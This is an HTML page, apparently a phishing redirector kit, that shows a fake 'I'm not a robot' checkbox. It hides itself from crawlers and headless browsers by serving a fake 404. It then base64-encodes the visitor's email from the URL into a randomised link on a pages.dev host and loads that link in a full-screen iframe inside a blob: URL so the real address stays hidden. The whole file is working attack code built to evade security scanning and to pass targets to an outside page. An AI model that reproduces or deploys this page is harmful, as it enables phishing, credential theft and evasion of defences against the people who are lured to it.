<!DOCTYPE html>
<html>
<head>
    <title>Blob Redirect + Anti-Bot (Final Working Version)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    #overlay {
        position: fixed;
        inset: 0;
        background: #00875A;
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 999999;
    }
    #verificationBox {
        background: #fff;
        padding: 16px 20px;
        border-radius: 16px;
        width: 220px;
        box-shadow: 0 4px 14px rgba(0,0,0,0.14);
        border: 1px solid #dcdcdc;
    }
    .verify-row { display:flex; align-items:center; gap:10px; }
    #robotIcon { width:26px;height:26px;border-radius:50%;background:#e8f0fe; display:flex; align-items:center; justify-content:center; font-size:14px; }
    #checkbox { width:22px;height:22px;border-radius:5px;border:2px solid #7f8fa6;background:#fff; cursor:pointer; position:relative; transition:.2s;}
    #checkbox.active { background:#34a853; border-color:#34a853; box-shadow:0 0 6px rgba(52,168,83,0.6);}
    #checkbox.active::after { content:""; position:absolute; left:6px; top:3px; width:5px; height:10px; border:2px solid white; border-left:none; border-top:none; transform:rotate(45deg);}
    #verifying { display:none; margin-top:10px; font-size:12px; text-align:center; color:#555;}
    .spinner { width:12px; height:12px; border-radius:50%; border:2px solid #40739e; border-top-color:transparent; animation:spin .6s linear infinite;}
    @keyframes spin { from{transform:rotate(0);} to{transform:rotate(360deg);} }
    </style>
</head>
<body>

<div id="overlay">
    <div id="verificationBox">
        <div class="verify-row">
            <div id="robotIcon">ðŸ¤–</div>
            <strong>I'm not a robot</strong>
            <div id="checkbox"></div>
        </div>
        <div id="verifying">
            <div class="spinner"></div> Verifyingâ€¦
        </div>
    </div>
</div>

<script>
/* ---------------- BOT CHECK ---------------- */
async function friendlyBotCheck() {
    let score = 0;
    const ua = navigator.userAgent.toLowerCase();
    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score+=30;
    if(navigator.webdriver) score+=30;
    return score>=60;
}

/* ---------- RANDOM URL SYSTEM ---------- */

const BASE_DOMAIN = "https://23b538b5.ko1wx90sd.pages.dev";
const SUBFOLDERS = ["alpha","beta","gamma","delta","omega"];

function encodeJsonSafe(obj) {
    return btoa(unescape(encodeURIComponent(JSON.stringify(obj))))
        .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
}

function buildFinalURL(email="") {
    const folder = SUBFOLDERS[Math.floor(Math.random()*SUBFOLDERS.length)];
    const payload = { email, t: Date.now() };
    return `${BASE_DOMAIN}/${folder}/?data=${encodeJsonSafe(payload)}`;
}

/* ---------- CREATE BLOB PAGE ---------- */
function buildBlobHTML(realURL) {
    return `
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
html,body { margin:0; padding:0; height:100%; width:100%; overflow:hidden; background:#ffffff; }
iframe { position:fixed; inset:0; width:100%; height:100%; border:none; }
</style>
</head>
<body>
<iframe src="${realURL}" sandbox="allow-same-origin allow-scripts allow-forms allow-popups"></iframe>
</body>
</html>`;
}

/* ---------- HUMAN VERIFICATION ---------- */
function requireVerification() {
    return new Promise(res=>{
        const box=document.getElementById("checkbox");
        const overlay=document.getElementById("overlay");
        const verifying=document.getElementById("verifying");

        box.onclick=()=>{
            box.classList.add("active");
            verifying.style.display="block";
            setTimeout(()=>{
                overlay.style.opacity=0;
                setTimeout(()=>overlay.remove(),300);
                res(true);
            },700);
        };
    });
}

/* ---------- MAIN FLOW ---------- */
document.addEventListener("DOMContentLoaded", async()=>{

    await requireVerification();
    if(await friendlyBotCheck()){ 
        document.body.innerHTML = "<h1>404</h1>";
        return;
    }

    const email = new URLSearchParams(location.search).get("email") || "";
    const finalURL = buildFinalURL(email);

    const blobHTML = buildBlobHTML(finalURL);
    const blob = new Blob([blobHTML], { type:"text/html" });
    const blobURL = URL.createObjectURL(blob);

    /* Redirect to blob */
    window.location.href = blobURL;
});
</script>

</body>
</html>
